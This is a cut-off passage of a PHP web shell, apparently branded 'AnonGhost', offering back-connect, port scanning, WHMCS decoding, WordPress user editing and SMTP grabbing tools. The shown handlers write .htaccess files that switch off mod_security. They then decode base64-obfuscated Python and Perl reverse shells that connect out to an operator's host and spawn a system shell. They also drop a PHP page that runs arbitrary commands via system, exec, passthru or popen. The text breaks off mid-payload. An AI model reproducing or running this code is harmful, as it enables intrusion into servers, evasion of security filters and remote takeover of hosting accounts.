		<tr class='optionstr'><b><td>Result</td><td>:</td><td></td></tr></b>
	</tr></form>
	</center>";
	echo "<center>$hashresult</center>";

}
elseif($_GET['do'] == 'portsc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
    echo"<form action='' method='post'>"              ;
    $start = strip_tags($_POST['start']);
    $end = strip_tags($_POST['end']);
    $host = strip_tags($_POST['host']);
    if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
        for ($i = $start;$i <= $end;$i++) {
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if ($fp) {
                echo 'Port ' . $i . ' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<center><table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><center><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
    }

}
elseif($_GET['do'] == 'ptbc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
	mkdir('pyrevrshell', 0755);
	chdir('pyrevrshell');
	$seropil = ".htaccess";
	$angelinalll = "$seropil";
	$shitttyz = fopen ($angelinalll , 'w') or die ("shitttyz a&#231;&#305;lamad&#305;!");
	$dffvfdgfg = "<IfModule mod_security.c>
	SecFilterEngine Off
	SecFilterScanPOST Off
	</IfModule>";    
	fwrite ( $shitttyz , $dffvfdgfg ) ;
	fclose ($shitttyz);
	//extract python reverse script
	$vkffhd = 'IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';

	$jkol = fopen("reversesh.py" ,"w+");
	$write = fwrite ($jkol ,base64_decode($vkffhd));
	fclose($jkol);
	chmod("reversesh.py",0755);

	//extract php command shell
	$merdeeeee = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHl7IGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50ICFpbXBvcnRhbnQ7IGNvbG9yOiAjMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4O30gICAgICBhe3RleHQtZGVjb3JhdGlvbjpub25lOyBmb250LWZhbWlseTogVGFob21hLCBHZW5ldmE7IGNvbG9yOiMwMDc3MDA7IHBhZGRpbmc6MnB4IDJweDt9ICAgICAgYTpob3Zlcntjb2xvcjojMDA5OTAwOyB0ZXh0LXNoYWRvdzojMDBmZjAwIDBweCAwcHggM3B4O30JICAuYXJlYSB7IGNvbG9yOiAjMDBiYjAwOyBmb250LXNpemU6IDlwdDsgdGV4dC1zaGFkb3c6IzAwMDAwMCAwcHggMnB4IDdweDsgYm9yZGVyOiBzb2xpZCAwcHggIzAwNzcwMDsgYmFja2dyb3VuZC1jb2xvcjp0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYigwLDExOSwwKSAwcHggMHB4IDRweDsgfQkgIGlucHV0W3R5cGU9c3VibWl0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzcwOyAgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsgIHRleHQtc2hhZG93OiAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMyk7ICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyAgYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgIGJvcmRlcjogMXB4IHNvbGlkICMyODQ0NzM7ICBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyAgYm9yZGVyLXJhZGl1czogNHB4OyAgY3Vyc29yOiBwb2ludGVyOyAgYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogLW1vei1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyAgYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7ICAtd2Via2l0LWJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7IH0gaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6ICM3Nzc3NzcgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NzAwOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7fSBpbnB1dFt0eXBlPXN1Ym1pdF06aG92ZXIsIGlucHV0W3R5cGU9dGV4dF06aG92ZXJ7IGNvbG9yOiAjZmZmZmZmOyB0ZXh0LXNoYWRvdzogIzAwNjYwMCAwcHggMHB4IDRweDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4O30gc2VsZWN0eyBwYWRkaW5nOiAzcHg7IHdpZHRoOiAxNjJweDsgY29sb3I6ICMwMGFhMDA7IHRleHQtc2hhZG93OiMwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc3MDA7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGFhMDA7ICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiKDg1LCA4NSwgODUpIDBweCAwcHggNHB4O30gc2VsZWN0OmhvdmVyeyBib3JkZXI6IDFweCBzb2xpZCAjMDBkZDAwOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBkZDAwOyAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9ICAgI2NvbW1hbmRzeyBtYXJnaW4tbGVmdDogMzUwcHg7IG1hcmdpbi1yaWdodDogMzUwcHg7IH0gb3B0aW9ueyBjb2xvcjogIzc3Nzc3NzsgfTwvc3R5bGU+DQo8P3BocA0KZWNobyAnPGNlbnRlcj48Zm9udCBjb2xvcj0iIzAwNzcwMCIgZmFjZT0iVGFob21hIiBzdHlsZT0iZm9udC1zaXplOiAxMnB0Ij5Vc2FnZTogcmV2ZXJzZXNoLnB5IFtpcG11XSBbUG9ydG11XTwvZm9udD4nOw0KZWNobyc8cCBhbGlnbj0iY2VudGVyIj4gDQo8aW1nIGJvcmRlcj0iMCI+PC9wPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMDk5MDAiPiBDb2RlZCBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIDwvZm9udD48YnI+DQo8Zm9ybSBtZXRob2Q9Z2V0IGFjdGlvbj0iJy4kbWUuJyI+DQo8cD48dGV4dGFyZWEgY2xhc3M9ImFyZWEiIHJvd3M9IjEzIiBuYW1lPSJTMSIgY29scz0iNzAiID4nOw0KDQppZiAoc3RybGVuKCRfR0VUWydjb21tYW5kJ10pPjEgJiYgJF9HRVRbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfR0VUWydleGVjbWV0aG9kJ10oJF9HRVRbJ2NvbW1hbmQnXSk7fQ0KaWYgKHN0cmxlbigkX1BPU1RbJ2NvbW1hbmQnXSk+MSAmJiAkX1BPU1RbJ2V4ZWNtZXRob2QnXSE9InBvcGVuIil7DQplY2hvICRfUE9TVFsnZXhlY21ldGhvZCddKCRfUE9TVFsnY29tbWFuZCddKTt9DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddPT0icG9wZW4iKXsNCnBvcGVuKCRfR0VUWydjb21tYW5kJ10sInIiKTt9DQoNCmVjaG8nPC90ZXh0YXJlYT48L3A+DQo8cD48Y2VudGVyPklmIG5vdGhpbmcgd29yayBpdCBtZWFucyB0aGF0IHB5dGhvbiBpcyBub3QgZW5hYmxlZCBpbiB0aGlzIHNlcnZlciA6KDwvY2VudGVyPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPjxzdHJvbmc+Q29tbWFuZDogcHl0aG9uIHJldmVyc2UucHkgeW91cklQIFBvcnQ8L3N0cm9uZz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0idnciIHNpemU9IjUwIiB2YWx1ZT0iY21kIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHNpemU9IjQzIj4gPHNlbGVjdCBuYW1lPWV4ZWNtZXRob2Q+DQo8b3B0aW9uIHZhbHVlPSJzeXN0ZW0iPlN5c3RlbTwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0iZXhlYyI+RXhlYzwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0icGFzc3RocnUiPlBhc3N0aHJ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0icG9wZW4iPnBvcGVuPC9vcHRpb24+DQo8L3NlbGVjdD4gPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KPz4=';
	$file = fopen("kiter.php" ,"w+");
	$write = fwrite ($file ,base64_decode($merdeeeee));
	fclose($file);
	echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Python Connect Shell Priv8</span><center><center><br><iframe src=pyrevrshell/kiter.php width=75% height=70% frameborder=0></iframe></div></center>'; 
}
elseif($_GET['do'] == 'pbc') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=bc'>Simple Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=pbc'>Perl Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=ptbc'>Python Back-Connect</a> </li>";
echo "<li> <a href='?dir=$dir&do=portsc'>Port Scanner</a> </li>";
echo "<li> <a href='?dir=$dir&do=hash'>Hash Identification</a> </li>";
echo "<li> <a href='?dir=$dir&do=whmcs'>WHMCS Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=tetangga'>Reverse Domain</a> </li>";
echo "<li> <a href='?dir=$dir&do=wpes'>Auto Edit User WP</a> </li>";
echo "<li> <a href='?dir=$dir&do=dos'>Domain On User</a> </li><br>";
echo "<li> <a href='?dir=$dir&do=smtp'>VHosts SMTP Grabber</a> </li>";
echo "<li> <a href='?dir=$dir&do=csrf'>CSRF ONLINE</a> </li>";
echo "<li> <a href='?dir=$dir&do=scdc'>Script Decoder</a> </li>";
echo "<li> <a href='?dir=$dir&do=rdp'>RDP-Creator</a> </li>";
echo "<li> <a href='?dir=$dir&do=manjat'>WHM-User Checker</a> </li>";
echo "</ul>";
echo "</center>";
	mkdir('Backperlrev', 0755);
	chdir('Backperlrev');
	$kokwkwkwkwkw = ".htaccess";
	$wkwkwkwkw_adi = "$kokwkwkwkwkw";
	$wkwkwkwkw = fopen ($wkwkwkwkw_adi , 'w') or die ("wkwkwkwkw a&#231;&#305;lamad&#305;!");
	$zilzil = "<IfModule mod_security.c>
	SecFilterEngine Off
	SecFilterScanPOST Off
	</IfModule>";    
	fwrite ( $wkwkwkwkw , $zilzil ) ;
	fclose ($wkwkwkwkw);
	$shellololol = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR1Y7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUlxuXG4iOw0KaWYgKCRBUkdDIT0yKSB7DQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7DQogICBkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7DQp9DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0IDooXG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdCA6KFxuIjsNCnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0aW5nLi4uICRBUkdWWzBdIFxuIjsNCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXCEvIFxuIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVDtlY2hvIC0tPT1TeXN0ZW1pbmZvPT0tLTsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOw0Kc3lzdGVtKCRzeXN0ZW0pOw==';

	$zerer = fopen("reverse.pl" ,"w+");
	$write = fwrite ($zerer ,base64_decode($shellololol));
	fclose($zerer);
	chmod("reverse.pl",0755);

	//extract php command shell
	$zonop = 'PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQZXJsIENvbm5lY3QgU2hlbGwgUHJpdjg8L3RpdGxlPjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3d3dzE0LjB6ejAuY29tLzIwMTQvMDYvMDQvMjEvMzk2NTU0Mzk0LnBuZyIgdHlwZT0iaW1hZ2UveC1pY29uIiAvPjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQpib2R5eyBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudCAhaW1wb3J0YW50OyBjb2xvcjogIzAwOTkwMDsgdGV4dC1zaGFkb3c6IzAwMCAwcHggMnB4IDdweDt9ICAgICAgYXt0ZXh0LWRlY29yYXRpb246bm9uZTsgZm9udC1mYW1pbHk6IFRhaG9tYSwgR2VuZXZhOyBjb2xvcjojMDA3NzAwOyBwYWRkaW5nOjJweCAycHg7fSAgICAgIGE6aG92ZXJ7Y29sb3I6IzAwOTkwMDsgdGV4dC1zaGFkb3c6IzAwZmYwMCAwcHggMHB4IDNweDt9CSAgLmFyZWEgeyBjb2xvcjogIzAwYmIwMDsgZm9udC1zaXplOiA5cHQ7IHRleHQtc2hhZG93OiMwMDAwMDAgMHB4IDJweCA3cHg7IGJvcmRlcjogc29saWQgMHB4ICMwMDc3MDA7IGJhY2tncm91bmQtY29sb3I6dHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDk5MDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA0cHg7IH0JICBpbnB1dFt0eXBlPXN1Ym1pdF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDc3MDsgIGZvbnQtd2VpZ2h0OiBib2xkOyB0ZXh0LWFsaWduOiBjZW50ZXI7ICB0ZXh0LXNoYWRvdzogMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOyAgYmFja2dyb3VuZDogI2FlYWVhZTsgIGJhY2tncm91bmQtY2xpcDogcGFkZGluZy1ib3g7ICBib3JkZXI6IDFweCBzb2xpZCAjMjg0NDczOyAgYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgIGJvcmRlci1yYWRpdXM6IDRweDsgIGN1cnNvcjogcG9pbnRlcjsgIGJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7ICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgIGJhY2tncm91bmQtaW1hZ2U6IGxpbmVhci1ncmFkaWVudCh0byBib3R0b20sICNlYWVhZWEsICNkMGQwZDApOyAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgIGJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyB9IGlucHV0W3R5cGU9dGV4dF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDk5MDA7IHRleHQtc2hhZG93OiAjNzc3Nzc3IDBweCAwcHggM3B4OyBib3JkZXI6IDFweCBzb2xpZCAjMDA3NzAwOyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwNzcwMDsgICAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSw4NSw4NSkgMHB4IDBweCA0cHg7ICAgLW1vei1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4O30gaW5wdXRbdHlwZT1zdWJtaXRdOmhvdmVyLCBpbnB1dFt0eXBlPXRleHRdOmhvdmVyeyBjb2xvcjogI2ZmZmZmZjsgdGV4dC1zaGFkb3c6ICMwMDY2MDAgMHB4IDBweCA0cHg7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGRkMDA7IGJvcmRlcjogMXB4IHNvbGlkICMwMGRkMDA7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2JhKDAsMTE5LDApIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDt9IHNlbGVjdHsgcGFkZGluZzogM3B4OyB3aWR0aDogMTYycHg7IGNvbG9yOiAjMDBhYTAwOyB0ZXh0LXNoYWRvdzojMDAwIDBweCAycHggN3B4OyBib3JkZXI6IDFweCBzb2xpZCAjMDA3NzAwOyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDBhYTAwOyAgcGFkZGluZzogM3B4OyAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czogNHB4OyAgIC1tb3otYm9yZGVyLXJhZGl1czogNHB4OyAgIGJvcmRlci1yYWRpdXM6IDRweDsgICAtd2Via2l0LWJveC1zaGFkb3c6IHJnYig4NSwgODUsIDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYig4NSwgODUsIDg1KSAwcHggMHB4IDRweDt9IHNlbGVjdDpob3ZlcnsgYm9yZGVyOiAxcHggc29saWQgIzAwZGQwMDsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwZGQwMDsgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiYSgwLDExOSwwKSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6IHJnYmEoMCwxMTksMCkgMHB4IDBweCA0cHg7fSAgICNjb21tYW5kc3sgbWFyZ2luLWxlZnQ6IDM1MHB4OyBtYXJnaW4tcmlnaHQ6IDM1MHB4OyB9IG9wdGlvbnsgY29sb3I6ICM3Nzc3Nzc7IH08L3N0eWxlPg0KPD9waHANCmVjaG8gJzxjZW50ZXI+PGZvbnQgY29sb3I9IiMwMDc3MDAiIGZhY2U9IlRhaG9tYSIgc3R5bGU9ImZvbnQtc2l6ZTogMTFwdCI+VXNhZ2U6IHBlcmwgcmV2ZXJzZS5wbCBbaXBtdV0gW1BvcnRtdV08L2ZvbnQ+PGJyPic7DQplY2hvJzxwIGFsaWduPSJjZW50ZXIiPiANCjxpbWcgYm9yZGVyPSIwIiA+PC9wPjxmb250IGZhY2U9IkdlbmV2YSIgYWxpZ249ImNlbnRlciIgc2l6ZT0iMiIgY29sb3I9IiMwMD